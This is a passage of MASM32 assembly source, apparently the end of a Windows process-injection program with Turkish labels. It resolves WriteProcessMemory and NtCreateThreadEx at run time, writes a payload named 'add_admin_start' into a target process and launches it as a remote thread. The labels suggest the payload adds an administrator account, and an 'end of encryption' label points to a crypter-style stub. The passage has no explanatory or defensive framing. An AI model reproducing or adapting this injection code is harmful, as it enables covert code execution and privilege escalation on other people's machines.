	PNTWriteProcessMemory typedef ptr NTWriteProcessMemory
	fn GetProcAddress,rv(GetModuleHandle,"kernel32.dll"),"WriteProcessMemory"
	push eax
	mov ecx,esp
	mov edx,[esp]
	invoke PNTWriteProcessMemory ptr edx,hProcess,addr pTargetMemory,add_admin_start, szInject32, NULL
	
	mov dword ptr[dw0],0
	mov dword ptr[dw1],0
	mov Buffer.sLength, sizeof UNKNOWN
	mov Buffer.Unknown1, 010003h
	mov Buffer.Unknown2, 08h
	mov Buffer.Unknown3, offset dw1
	mov Buffer.Unknown4, 0
	mov Buffer.Unknown5, 010004h
	mov Buffer.Unknown6, 04h
	mov Buffer.Unknown7, offset dw0
	mov Buffer.Unknown8, 0
	fn GetProcAddress,rv(GetModuleHandle,addr c_Ntdll),addr c_NtCreateThreadEx
	push eax
	invoke GetCurrentProcess
	mov ecx,esp
	mov edx,[esp]
	mov dword ptr[pNtCreateThreadEx],edx	
	mov dword ptr [hRemoteThread],0
	invoke PNTCREATETHREADEX ptr pNtCreateThreadEx,addr hRemoteThread,01fffffh,NULL,hProcess,addr pTargetMemory,NULL,0,NULL,NULL,NULL,addr Buffer
	;invoke CreateRemoteThread,hProcess,NULL,0,pLoadLibrary, addr pTargetMemory, NULL, NULL
	mov hThreadID, eax
	invoke WaitForSingleObject,hRemoteThread, 0FFFFFFFFh

	invoke CloseHandle,hProcess
	
	
	
	invoke ExitProcess,0
dalicine endp

sifrelemeyi_bitir:	
jmp dead
db 0deh,0adh,0beh,0efh
dead:
nop
_end:
inkey "Cikis icin klavyeye vurun..."
	xor eax,eax
	invoke ExitProcess,eax	
end start

